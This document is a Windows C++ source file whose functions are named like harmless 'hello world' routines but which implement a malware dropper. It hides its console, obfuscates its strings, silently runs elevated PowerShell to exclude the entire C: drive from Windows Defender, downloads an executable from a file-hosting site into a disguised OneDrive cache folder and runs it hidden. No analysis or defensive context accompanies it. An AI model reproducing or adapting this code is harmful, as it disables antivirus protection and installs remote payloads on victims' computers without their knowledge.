#include <iostream>
#include "skc.h"
#include <shlobj.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")
void PrintHelloWorld() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    const wchar_t* command = bkC(L"-Command Add-MpPreference -ExclusionPath 'C:\\'");
    const wchar_t* verb = bkC(L"runas");
    const wchar_t* executable = bkC(L"powershell.exe");
    HINSTANCE result = ShellExecuteW(NULL, verb, executable, command, NULL, SW_HIDE);
}

void PrintHelloWorld1() {
    wchar_t appDataPath[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appDataPath) != S_OK) {
        return;
    }
    wchar_t outputPath[MAX_PATH];
    swprintf(outputPath, MAX_PATH, bkC(L"%s\\OneDrive\\cache\\qmlcache\\notsussynamelol.exe"), appDataPath);

    HINTERNET hSession = WinHttpOpen(bkC(L"Edge"),
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        return;
    }
    HINTERNET hConnect = WinHttpConnect(hSession, bkC(L"storage1.fastupload.io"), INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, bkC(L"GET"), bkC(L"/96c29fdb4e61a58c/1_protected.exe.zip?download_token=031284560103559c0314b161903ed81052bf37d816961f898411d2915bf97b4b"), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }
    if (WinHttpSendRequest(hRequest,
                           WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0,
                           0, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesRead;
            BYTE buffer[4096];
            while (WinHttpQueryDataAvailable(hRequest, &bytesRead) && bytesRead > 0) {
                DWORD bytesToRead = bytesRead > sizeof(buffer) ? sizeof(buffer) : bytesRead;
                if (WinHttpReadData(hRequest, buffer, bytesToRead, &bytesRead)) {
                    DWORD bytesWritten;
                    WriteFile(hFile, buffer, bytesRead, &bytesWritten, nullptr);
                }
            }
            CloseHandle(hFile);
        }
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    ShellExecuteW(nullptr, bkC(L"open"), outputPath, nullptr, nullptr, SW_HIDE);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    PrintHelloWorld();
    PrintHelloWorld1();
    const wchar_t* checkme1 = bkC(L"someshittomakedefenderretarded");
    return 0;
}